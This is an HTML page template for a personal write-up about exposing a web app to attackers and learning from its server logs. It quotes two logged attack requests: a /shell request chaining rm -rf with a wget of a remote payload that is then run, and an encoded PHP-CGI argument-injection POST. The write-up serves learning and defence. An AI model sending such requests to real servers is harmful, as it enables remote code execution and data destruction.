@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Security Experiment</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='/bootstrap/css/bootstrap.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='/bootstrap/css/custom.css') }}">
+</head>
+
+<body>
+    <h1>Introduction</h1>
+    <p>On a quest to learn about cybersecurity related to web applications, I went on a bit different learning path than one would usually take. I gave a hacker our IP address, and here I explain why I did it and what I learned.</p>
+
+    <h2>How It Started</h2>
+    <p>In mid October, I started to think about how to test the security of the web app we had launched. A couple of days later, I received a "phishing" text message, to which I replied with our web app's IP address. Crazy, right?</p>
+
+    <p>Yes, definitely, but I had nothing to lose as the web app doesn't store, collect, or process any delicate data. In the worst case, I could replicate the project with a new IP quickly.</p>
+
+    <h2>Why?</h2>
+    <p>The best way for me to learn is to do and try things out. I reasoned that by giving the IP address to a real hacker, I would be able to:</p>
+    <ul>
+        <li>Gather valuable data about common vulnerabilities related to web apps</li>
+        <li>Make my learning curve steeper and more meaningful</li>
+        <li>Actually test the security (heads up, so far so good)</li>
+        <li>Write scripts to scan logs for odd behavior and ban IP addresses</li>
+    </ul>
+
+    <h3>Examples of Malicious Requests</h3>
+    <p>I will show you a few examples of malicious requests that our web server has received during the past couple of weeks.</p>
+
+    <p>Here's one example of a malicious attempt:</p>
+    <pre>
+        <code>
+IP ADDRESS - - [04/Nov/2023:15:50:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+IP ADDRESS/jaws;sh+/tmp/jaws HTTP/1.1" 404 232 "-" "Hello, world"
+        </code>
+    </pre>
+    <p>For example, in this specific case, the attacker is trying to download a script from an IP address and then trying to run it on the server. The last bit of the request "Hello, world" is an attempt to obfuscate the server and try to blend in as normal traffic to a web server. I have replaced the attacker's real (or VPN) IP with "IP ADDRESS".</p>
+
+    <p>Another interesting one, this time a POST request:</p>
+    <pre>
+        <code>
+IP ADDRESS - - [25/Oct/2023:16:02:01 +0000] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
+        </code>
+    </pre>
+
+    <p>This one in particular attempts to send data to the server using URL-encoded query parameters. The attacker is trying to manipulate PHP configuration settings by sending a series of parameters in the POST request. Luckily, we didn't use any PHP in our project.</p>
+
+    <p>These two represent just a fraction of what our server has seen so far in the past couple of weeks.</p>
+
+    <h2>Learnings & Key Takeaways</h2>
+    <p>As a key takeaway, I can say that cybersecurity is a process of testing systems, scripting, logging, banning, and making sure that your attack surface is as narrow as possible.</p>
+
+    <p>It is important to monitor your web server traffic to identify potential vulnerabilities.</p>
+
+    <p>I am learning things to think of when planning new projects and designing the security features for them.</p>
+
+    <p>Overall, the experiment has been fruitful as we are able to collect data and make our future projects more secure.</p>
+
+    <p>If you want to know more about this experiment, the actual log files, or other information, feel free to connect with me.</p>
+    <script src="{{ url_for('static', filename='/bootstrap/js/bootstrap.min.js') }}"></script>
+</body>
+</html>
